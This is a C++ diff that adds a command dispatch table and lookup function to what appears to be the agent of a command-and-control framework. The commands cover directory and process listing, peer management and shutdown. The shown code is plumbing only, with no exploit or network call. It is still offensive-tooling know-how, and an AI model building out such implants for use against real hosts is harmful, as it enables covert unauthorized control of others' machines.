@@ -1,6 +1,16 @@
 #include <core/include/commands.hpp>
 namespace Commands {
 
+    __code_seg(".rdata") _command_map cmd_map[] = {
+        {.name = DIRECTORYLIST, .address = Commands::DirectoryList  },
+        {.name = PROCESSMODULES,.address = Commands::ProcessModules },
+        {.name = PROCESSLIST,	.address = Commands::ProcessList    },
+        {.name = ADDPEER,		.address = Commands::AddPeer        },
+        {.name = REMOVEPEER,	.address = Commands::RemovePeer     },
+        {.name = SHUTDOWN,		.address = Commands::Shutdown       },
+        {.name = 0,				.address = nullptr					}
+    };
+
     VOID DirectoryList (_parser *const parser) {
         HEXANE
 
@@ -238,4 +248,27 @@ namespace Commands {
         // Exit
         ntstatus = ERROR_EXIT;
     }
+
+
+    UINT_PTR GetCommandAddress(const uint32_t name, bool* internal) {
+        HEXANE
+
+        uintptr_t address = { };
+        *internal = false;
+
+        for (uint32_t i = 0 ;; i++) {
+            if (!Commands::cmd_map[i].name) {
+                return_defer(ERROR_PROC_NOT_FOUND);
+            }
+
+            if (Commands::cmd_map[i].name == name) {
+                *internal = true;
+                address = U_PTR(Commands::cmd_map[i].address);
+            }
+        }
+
+        defer:
+        return address;
+    }
+
 }
